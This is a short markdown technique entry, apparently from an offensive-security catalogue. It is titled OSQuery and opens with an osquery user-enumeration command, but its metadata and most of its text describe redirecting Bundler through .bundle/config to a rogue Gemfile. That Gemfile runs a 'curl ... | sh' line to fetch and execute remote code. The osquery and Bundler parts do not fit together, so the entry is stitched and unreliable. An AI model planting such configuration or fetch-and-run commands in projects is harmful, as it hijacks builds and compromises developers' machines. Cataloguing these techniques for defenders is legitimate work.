---
title: OSQuery
tags:
- Enum
- Exec
- config-file
references: 
- https://bundler.io/v2.5/man/bundle-config.1.html
files: ['Gemfile', '*.gemspec*', '.bundle/config']
purl: pkg:gem/bundler
---

osquery is an operating system instrumentation framework for Windows, OS X (macOS), and Linux. The tools make low-level operating system analytics and monitoring both performant and intuitive..

```Enumerate users
osqueryi --json "SELECT username, description, sid, directory FROM users;"
```



If the Gemfile cannot be modified, Bundler can use a local configuration in `.bundle/config` that allows changing the path of the Gemfile. 

```yaml 
---
BUNDLE_GEMFILE: "NotGemfile"
BUNDLE_PATH: "vendor/bundle"
BUNDLE_DEPLOYMENT: "true"
```

The rogue Gemfile `NotGemfile` can then be used to execute commands:
```ruby

# Execute arbitrary commands
system("curl ... | sh")
 
# Optional: load the original Gemfile to avoid errors
eval_gemfile "Gemfile"
```

Note: Bundler configuration properties defined in `$HOME/.bundle/config` and in environment variables have precedence over the local configuration file.
